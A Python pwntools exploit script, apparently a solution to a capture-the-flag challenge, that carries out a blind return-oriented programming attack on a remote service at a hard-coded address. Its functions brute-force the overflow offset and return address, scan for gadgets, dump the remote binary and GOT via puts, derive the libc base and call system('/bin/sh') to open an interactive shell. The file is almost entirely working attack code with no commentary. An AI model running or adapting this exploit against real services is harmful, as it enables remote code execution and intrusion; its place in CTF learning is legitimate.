import pwn
# Global Variables
libc = pwn.ELF("libc-2.23.so")
HOST = "34.159.129.6"
PORT = 30550
OFFSET = 88
BINARY_BASE = 0x400000
RIP = 0x40070a
DUMP_FUNC = BINARY_BASE + 1806
LOOPBACK_FUNC = BINARY_BASE + 0x5c0
BROP_GADGET = 0x4007ba
CALL_PUTS = 0x400560
PUTS_GOT = 0x601018


def Test():
    io = pwn.remote(HOST, PORT)
    io.recvuntil(b'?\n')
    payload = b'A'*OFFSET
    payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
    payload += pwn.p64(BINARY_BASE)
    payload += pwn.p64(0x40071f)
    print(hex(BROP_GADGET + 9))
    io.send(payload)
    mssg = io.recvall()
    print(mssg)
    io.interactive()


def GetRipOffset():
    offset = 1
    while True:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*offset
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall()
        if b'No password' not in mssg:
            break
        offset += 1
    return offset-1


def BruteRip():
    rip = b''
    for i in range(0, 8):
        for j in range(0, 256):
            io = pwn.remote(HOST, PORT, level='critical')
            payload = b'A'*OFFSET + rip + pwn.p8(j)
            io.send(payload)
            mssg = io.recv()
            if b'No password' in mssg:
                rip += pwn.p8(j)
                pwn.log.success("RIP: " + hex(pwn.unpack(rip, 'all')))
                io.close()
                break
            io.close()
    return rip


def ScanText():
    for i in range(0, 0x1000):
        pwn.log.info("Scanning: " + hex(BINARY_BASE + i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET + pwn.p64(BINARY_BASE + i)
        io.send(payload)
        mssg = io.recv(0x1000)
        if mssg != b'Are you blind my friend?\n' and mssg != b'Are you blind my friend?':
            print("Offset", i, "Addr", BINARY_BASE+i, mssg)
        io.close()


def FindBropGadget():
    possible = []
    for i in range(BINARY_BASE, BINARY_BASE+0x1000):
        pwn.log.info("Scanning: " + hex(i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i)  # Possible pop gadget
        payload += pwn.p64(0)  # pop rbx
        payload += pwn.p64(0)  # pop rbp
        payload += pwn.p64(0)  # pop r12
        payload += pwn.p64(0)  # pop r13
        payload += pwn.p64(0)  # pop r14
        payload += pwn.p64(0)  # pop r15
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
            possible.append(i)
        io.close()
    return possible


def CheckBROP():
    # possible = [4196110, 4196282]
    # for i in possible:
    #     io = pwn.remote(HOST, PORT, level='critical')
    #     payload = b'A'*OFFSET
    #     payload += pwn.p64(i + 7)  # possilbe pop 2 gadget
    #     payload += pwn.p64(0)  # pop rsi
    #     payload += pwn.p64(0)  # pop r15
    #     payload += pwn.p64(DUMP_FUNC)
    #     io.send(payload)
    #     mssg = io.recv(0x1000, timeout=0.2)
    #     if b'Do not dump' in mssg:
    #         pwn.log.success("Found pop gadget at: " + hex(i))
    #     io.close()
    possible = [4196110, 4196282]
    for i in possible:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i + 9)  # possilbe pop 2 gadget
        payload += pwn.p64(0)  # pop rdi
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
        io.close()


def FindLeakFunc():
    funcs = []
    for i in range(BINARY_BASE, BINARY_BASE+0x4000):
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(BINARY_BASE)
        payload += pwn.p64(i)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'ELF' in mssg:
            pwn.log.success("Found leak func at: " + hex(i))
            funcs.append(i)
        io.close()
    return funcs


def LeakELF():
    f = open('leak.elf', 'wb')
    offset = BINARY_BASE
    while(offset < BINARY_BASE + 0x4000):
        pwn.log.info("At offset: " + hex(offset))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(offset)
        payload += pwn.p64(CALL_PUTS)
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall().strip()
        print(hex(pwn.unpack(mssg, 'all')))
        if len(mssg) == 0:
            f.write(b'\x00')
            offset += 1
        else:
            f.write(mssg)
            offset += len(mssg)
        io.close()
        f.flush()


def LeakGOT():
    for i in range(0x600000, 0x600000+0x4000, 8):
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(i)
        payload += pwn.p64(CALL_PUTS)
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall().strip()
        if b'\x7f' in mssg:
            pwn.log.success("Found Possible GOT at: " + hex(i))
            io.close()
        io.close()


def scanQWORD(l):
    for x in l:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(x)
        payload += pwn.p64(CALL_PUTS)
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall().strip()
        mssg = mssg[0:8]
        mssg = pwn.unpack(mssg, 'all')
        pwn.log.success("QWORD @ Memory -" + hex(x) + ": " + hex(mssg))
        io.close()


def exploit():
    io = pwn.remote(HOST, PORT)
    payload = b'A'*OFFSET
    payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
    payload += pwn.p64(PUTS_GOT)
    payload += pwn.p64(CALL_PUTS)
    payload += pwn.p64(LOOPBACK_FUNC)
    io.recvuntil(b"?\n")
    io.send(payload)
    leak = io.recvline().strip()
    leak = pwn.unpack(leak, 'all')
    pwn.log.success("Puts Leak: " + hex(leak))
    libc.address = leak - libc.symbols['puts']
    pwn.log.success("Libc Address: " + hex(libc.address))
    io.recvuntil(b"?\n")
    binsh = next(libc.search(b'/bin/sh\0'))
    payload = b'A'*OFFSET
    payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
    payload += pwn.p64(binsh)
    payload += pwn.p64(libc.sym['system'])
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    # len = GetRipOffset()
    # print(BruteRip())
    # ScanText()
    # print(FindBropGadget())
    # CheckBROP()
    # print(FindLeakFunc())
    # LeakELF()
    # LeakGOT()
    scanQWORD([0x600000, 0x600288, 0x600ef0, 0x601010, 0x601018,
              0x601020, 0x601028, 0x601030, 0x601038, 0x601070, 0x601080])
    # exploit()
    # Test()
